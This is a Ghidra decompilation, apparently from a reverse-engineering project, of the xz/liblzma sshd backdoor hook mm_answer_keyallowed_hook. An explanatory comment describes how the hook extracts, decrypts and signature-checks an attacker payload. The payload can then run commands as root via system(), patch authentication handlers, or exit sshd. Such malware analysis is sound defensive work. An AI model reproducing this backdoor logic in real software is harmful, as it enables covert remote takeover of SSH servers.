// /home/kali/xzre-ghidra/xzregh/108EA0_mm_answer_keyallowed_hook.c
// Function: mm_answer_keyallowed_hook @ 0x108EA0
// Calling convention: unknown
// Prototype: undefined mm_answer_keyallowed_hook(void)


/*
 * AutoDoc: Drives the decrypted payload state machine: it extracts sshbuf chunks from the monitor
 * message, pieces together and decrypts the staged payload, validates signatures against the
 * cached host_pubkeys, optionally runs privilege escalation (setresuid/setresgid + system), and
 * only then patches mm_answer_keyverify/mm_answer_authpassword before tail-calling the genuine
 * mm_answer_keyallowed. On failure it resets the payload_state and, if instructed, exits sshd
 * entirely.
 */
#include "xzre_types.h"


undefined8 mm_answer_keyallowed_hook(undefined8 param_1,undefined4 param_2,undefined8 param_3)

{
  char cVar1;
  code *UNRECOVERED_JUMPTABLE;
  ulong uVar2;
  code *pcVar3;
  int iVar4;
  long lVar5;
  ulong uVar6;
  long lVar7;
  ulong uVar8;
  undefined8 uVar9;
  long lVar10;
  long lVar11;
  long lVar12;
  long lVar13;
  ulong uVar14;
  undefined1 *puVar15;
  undefined8 *puVar16;
  ushort *puVar17;
  byte bVar18;
  undefined8 payload_ctx;
  undefined8 orig_handler;
  undefined8 uStack_129;
  undefined1 payload_buf [41];
  undefined8 local_f8 [3];
  undefined8 local_e0 [6];
  undefined8 local_aa [2];
  undefined1 local_9a [106];
  
  lVar7 = global_ctx;
  bVar18 = 0;
  if (global_ctx == 0) {
    return 0;
  }
  lVar11 = *(long *)(global_ctx + 0x10);
  if (lVar11 == 0) {
    return 0;
  }
  lVar12 = *(long *)(global_ctx + 0x20);
  if (lVar12 == 0) {
    return 0;
  }
  if (*(long *)(global_ctx + 0xf0) == 0) {
    return 0;
  }
  UNRECOVERED_JUMPTABLE = *(code **)(lVar12 + 0x48);
  if (UNRECOVERED_JUMPTABLE == (code *)0x0) goto LAB_00109471;
  if (*(int *)(global_ctx + 0x104) == 4) goto LAB_0010944f;
  iVar4 = check_backdoor_state(global_ctx);
  if (((iVar4 == 0) || (*(int *)(lVar7 + 0x104) == 4)) || (*(int *)(lVar7 + 0x104) == -1))
  goto LAB_00109429;
  puVar16 = local_f8;
  for (lVar10 = 0x12; lVar10 != 0; lVar10 = lVar10 + -1) {
    *(undefined4 *)puVar16 = 0;
    puVar16 = (undefined8 *)((long)puVar16 + (ulong)bVar18 * -8 + 4);
  }
  payload_ctx = 0;
  iVar4 = sshbuf_extract(param_3,lVar7,local_f8,local_e0);
  if ((iVar4 == 0) ||
     (iVar4 = extract_payload_message(local_f8,local_e0[0],&payload_ctx,lVar7), iVar4 == 0))
  goto LAB_0010944f;
  decrypt_payload_message(local_f8[0],payload_ctx,lVar7);
  iVar4 = *(int *)(lVar7 + 0x104);
  if (iVar4 == 3) {
LAB_00109216:
    puVar17 = *(ushort **)(lVar7 + 0xf8);
    if (puVar17 != (ushort *)0x0) {
      uVar8 = (ulong)*puVar17;
      cVar1 = *(char *)((long)puVar17 + 0x3b);
      uVar14 = uVar8 - 0x120;
      if (cVar1 == '\x02') {
        if ((((*(long *)(*(long *)(lVar7 + 0x20) + 0x78) != 0) && (4 < uVar14)) &&
            (uVar14 = (ulong)puVar17[0x57], puVar17[0x57] != 0)) &&
           ((uVar14 < uVar8 - 0x122 && (uVar8 = (uVar8 - 0x122) - uVar14, 2 < uVar8)))) {
          puVar15 = (undefined1 *)((long)puVar17 + uVar14 + 0xb0);
          *(undefined1 *)(lVar12 + 0x84) = *puVar15;
          *(undefined1 *)(lVar12 + 0x85) = puVar15[1];
          if ((*(ushort *)(lVar12 + 0x84) == 0) || (uVar8 - 2 < (ulong)*(ushort *)(lVar12 + 0x84)))
          {
            *(undefined2 *)(lVar12 + 0x84) = 0;
          }
          else {
            lVar11 = *(long *)(lVar7 + 0x20);
            uVar9 = *(undefined8 *)(lVar7 + 0x10);
            *(ulong *)(lVar12 + 0x88) = (long)puVar17 + uVar14 + 0xb2;
            lVar12 = *(long *)(lVar11 + 0x20);
            if (lVar12 != 0) {
              **(long **)(lVar11 + 0x78) = lVar12;
              lVar7 = fd_write(param_2,puVar17 + 0x58,uVar14,uVar9);
              if (-1 < lVar7) {
                return 0;
              }
              goto LAB_0010944f;
            }
          }
        }
      }
      else if (cVar1 == '\x03') {
        if (((*(long *)(lVar11 + 0x30) != 0) && (8 < uVar14)) &&
           (*(char *)((long)puVar17 + (uVar8 - 0x73)) == '\0')) {
          uVar14 = *(ulong *)(puVar17 + 0x57);
          uVar8 = uVar14 >> 0x20;
          if ((((int)(uVar14 >> 0x20) == 0) ||
              (iVar4 = (**(code **)(lVar11 + 0x20))(uVar8,uVar8,uVar8), iVar4 != -1)) &&
             (((int)uVar14 == 0 ||
              (iVar4 = (**(code **)(lVar11 + 0x28))
                                 (uVar14 & 0xffffffff,uVar14 & 0xffffffff,uVar14 & 0xffffffff),
              iVar4 != -1)))) {
            (**(code **)(lVar11 + 0x30))(puVar17 + 0x5b);
            *(undefined4 *)(lVar7 + 0x104) = 4;
            goto LAB_0010944f;
          }
        }
      }
      else if (((cVar1 == '\x01') && (*(long *)(*(long *)(lVar7 + 0x20) + 0x38) != 0)) &&
              (1 < uVar14)) {
        *(char *)(lVar12 + 0x90) = (char)puVar17[0x57];
        *(undefined1 *)(lVar12 + 0x91) = *(undefined1 *)((long)puVar17 + 0xaf);
        if (*(ushort *)(lVar12 + 0x90) == 0) {
          puVar17 = (ushort *)0x0;
        }
        else {
          puVar17 = puVar17 + 0x58;
          if (uVar8 - 0x122 < (ulong)*(ushort *)(lVar12 + 0x90)) {
            *(undefined2 *)(lVar12 + 0x90) = 0;
            goto LAB_00109429;
          }
        }
        *(ushort **)(lVar12 + 0x98) = puVar17;
        *(undefined4 *)(lVar7 + 0x104) = 4;
        iVar4 = sshd_patch_variables(1,0,0,0,lVar7);
LAB_001092e5:
        if (iVar4 != 0) goto LAB_0010944f;
      }
    }
  }
  else if (iVar4 < 4) {
    if (iVar4 == 0) {
      if (*(ulong *)(lVar7 + 0xe8) < 0xae) goto LAB_0010944f;
      puVar15 = payload_buf;
      for (lVar11 = 0x29; lVar11 != 0; lVar11 = lVar11 + -1) {
        *puVar15 = 0;
        puVar15 = puVar15 + (ulong)bVar18 * -2 + 1;
      }
      lVar11 = *(long *)(lVar7 + 0xf0);
      orig_handler = 0;
      uStack_129 = 0;
      if (((lVar11 != 0) && (*(long *)(lVar7 + 0x28) != 0)) &&
         ((*(long *)(*(long *)(lVar7 + 0x28) + 8) != 0 && (*(long *)(lVar7 + 0xf8) == 0)))) {
        *(long *)(lVar7 + 0xf8) = lVar11;
        local_aa[0] = 0;
        local_aa[1] = 0;
        puVar15 = local_9a;
        for (lVar12 = 0x4a; lVar12 != 0; lVar12 = lVar12 + -1) {
          *puVar15 = 0;
          puVar15 = puVar15 + (ulong)bVar18 * -2 + 1;
        }
        lVar12 = 0;
        do {
          *(undefined1 *)((long)local_aa + lVar12) = *(undefined1 *)(lVar11 + 2 + lVar12);
          lVar12 = lVar12 + 1;
        } while (lVar12 != 0x3a);
        iVar4 = secret_data_get_decrypted(&orig_handler,lVar7);
        if ((iVar4 != 0) &&
           (iVar4 = verify_signature(*(undefined8 *)
                                      (*(long *)(*(long *)(lVar7 + 0x28) + 8) +
                                      (ulong)*(uint *)(lVar7 + 0x100) * 8),local_aa,0x3a,0x5a,
                                     *(long *)(lVar7 + 0xf8) + 0x3c,&orig_handler,lVar7), iVar4 != 0
           )) {
          *(undefined4 *)(lVar7 + 0x104) = 1;
          puVar16 = &orig_handler;
          for (lVar11 = 0x39; lVar11 != 0; lVar11 = lVar11 + -1) {
            *(undefined1 *)puVar16 = 0;
            puVar16 = (undefined8 *)((long)puVar16 + (ulong)bVar18 * -2 + 1);
          }
          iVar4 = check_backdoor_state(lVar7);
          goto LAB_001092e5;
        }
      }
      *(undefined4 *)(lVar7 + 0x104) = 0xffffffff;
      *(undefined8 *)(lVar7 + 0xf8) = 0;
    }
    else if ((iVar4 == 1) && (*(ushort **)(lVar7 + 0xf8) != (ushort *)0x0)) {
      uVar8 = (ulong)**(ushort **)(lVar7 + 0xf8);
      uVar14 = *(ulong *)(lVar7 + 0xe8);
      if (uVar14 <= uVar8) {
        if (uVar14 != uVar8) goto LAB_0010944f;
        uVar8 = *(ulong *)(lVar7 + 0xe0);
        uVar2 = *(ulong *)(lVar7 + 0x98);
        if ((uVar8 < uVar2) || (uVar14 = uVar14 - 0x72, uVar8 - uVar2 <= uVar14)) {
LAB_00109471:
          if (*(code **)(lVar11 + 0x18) != (code *)0x0) {
            (**(code **)(lVar11 + 0x18))(0);
          }
          return 0;
        }
        local_aa[0] = 0;
        local_aa[1] = 0;
        puVar15 = local_9a;
        for (lVar10 = 0x62; lVar10 != 0; lVar10 = lVar10 + -1) {
          *puVar15 = 0;
          puVar15 = puVar15 + (ulong)bVar18 * -2 + 1;
        }
        lVar13 = *(long *)(lVar7 + 0xf0) + uVar14;
        lVar10 = 0;
        do {
          lVar5 = lVar10 + 1;
          *(undefined1 *)(lVar10 + (long)local_aa) = *(undefined1 *)(lVar13 + lVar10);
          lVar10 = lVar5;
        } while (lVar5 != 0x72);
        if ((uVar8 < uVar14) || (uVar6 = 0, uVar8 - uVar14 < uVar2)) goto LAB_00109471;
        for (; uVar2 != uVar6; uVar6 = uVar6 + 1) {
          *(undefined1 *)(lVar13 + uVar6) = *(undefined1 *)(lVar7 + 0xa0 + uVar6);
        }
        iVar4 = verify_signature(*(undefined8 *)
                                  (*(long *)(*(long *)(lVar7 + 0x28) + 8) +
                                  (ulong)*(uint *)(lVar7 + 0x100) * 8),*(undefined8 *)(lVar7 + 0xf0)
                                 ,uVar14 + *(long *)(lVar7 + 0x98),*(undefined8 *)(lVar7 + 0xe0),
                                 local_aa,*(long *)(lVar7 + 0xf8) + 2,lVar7,
                                 (ulong)*(uint *)(lVar7 + 0x100));
        if (iVar4 == 0) {
          *(undefined4 *)(lVar7 + 0x104) = 0xffffffff;
          goto LAB_00109471;
        }
        *(undefined4 *)(lVar7 + 0x104) = 3;
        goto LAB_00109216;
      }
    }
  }
  else if (iVar4 == 4) goto LAB_0010944f;
LAB_00109429:
  if (((*(long *)(lVar7 + 0x10) != 0) &&
      (pcVar3 = *(code **)(*(long *)(lVar7 + 0x10) + 0x18), pcVar3 != (code *)0x0)) &&
     (*(undefined4 *)(lVar7 + 0x104) = 0xffffffff, *(int *)(lVar7 + 0x50) != 0)) {
    (*pcVar3)(0);
  }
LAB_0010944f:
                    /* WARNING: Could not recover jumptable at 0x0010946f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar9 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3);
  return uVar9;
}

